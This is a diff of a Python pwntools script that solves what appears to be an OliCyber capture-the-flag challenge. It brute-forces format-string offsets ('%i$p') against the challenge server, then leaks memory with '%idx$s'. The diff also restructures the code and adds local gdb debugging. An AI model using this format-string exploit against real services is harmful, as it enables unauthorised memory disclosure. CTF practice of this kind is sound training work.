@@ -1,24 +1,49 @@
 from pwn import *
 
-idx = 0
+exe = ELF("scotti", checksec=True)
 
-for i in range(1, 100):
-    r = remote('scotti.challs.olicyber.it', 12202)
+context.binary = exe
 
-    r.recvuntil(b'risposta? ')
-    r.sendline(b'.. ' + str(f'%{i}$p').encode() + b' ..')
-    r.recvuntil(b'..')
-    data = r.recvuntil(b'..')
-    if b'0x7' in data:
-        idx = i + 1
-        break
-    r.close()
+HOST = "scotti.challs.olicyber.it"
+PORT = 12202
 
-r = remote('scotti.challs.olicyber.it', 12202)
+gdbscript = """
+set follow-fork-mode child
+"""
 
-r.recvuntil(b'risposta? ')
-r.sendline(f'%{idx}$s!'.encode())
-r.recvline()
+# args.LOCAL = True
+args.DEBUG = True
 
-data = r.recvuntil(b'!')[:-1]
-print(data.decode())
+def conn():
+    if args.LOCAL:
+        r = process(exe.path)
+        if args.DEBUG:
+            gdb.attach(r, gdbscript=gdbscript)
+    else:
+        r = remote(HOST, PORT)
+
+    return r
+
+def main():
+    idx = 0
+    
+    for i in range(1, 100):
+        r = conn()
+
+        r.recvuntil(b"risposta? ")
+        r.sendline(b".. " + str(f"%{i}$p").encode() + b" ..")
+        r.recvuntil(b"..")
+        data = r.recvuntil(b"..")
+        if b"0x7" in data:
+            idx = i + 1
+            break
+        r.close()
+
+    r = conn()
+    r.recvuntil(b"risposta? ")
+    r.sendline(f"%{idx}$s!".encode())
+
+    r.interactive()
+    
+if __name__ == "__main__":
+    main()
